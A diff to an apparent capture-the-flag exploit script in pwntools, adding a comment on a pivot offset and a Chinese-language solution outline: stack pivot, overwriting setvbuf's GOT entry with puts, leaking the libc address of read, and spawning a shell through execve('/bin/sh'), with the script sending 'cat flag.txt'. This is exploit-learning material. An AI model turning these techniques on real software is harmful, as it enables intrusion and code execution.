@@ -18,6 +18,8 @@ first_pivot_address   = 0x4040b0 + 0x80
 setvbuf_pivot_address = 0x404028 + 0x80
 stdin_pivot_address   = 0x404050 + 0x80
 
+# (+ 0x80) since the gadget is { lea    rax,[rbp-0x80] }
+
 # pause()
 
 info(f'First Stage Pivoting to {hex(first_pivot_address)}')
@@ -87,6 +89,15 @@ p.sendline(payload)
 # p.interactive()
 p.sendline(b'cat flag.txt')
 print(p.recv())
+
+# 解題思路：
+# 1. stack pivot to setvbuf 下面, 再跳回 hackMe
+# 2. 將 ROP chain 寫入 step 1 動過的 stack, 再將 stack pivot to setvbuf
+# 3. 修改 setvbuf.GOT  為 puts@plt
+# 4. 修改 FILE * stdin 為 read@got （FILE * stdin 是 setvbuf 的第一個參數）
+# 5. call setvbuf (puts) in main -> leak libc base address of read
+# 6. 因為 stack 壞了，所以要 Make execve('/bin/sh', 0, 0) (system() 會檢查 stack)
+
 
 # -------------------------------------
 # useful commands:
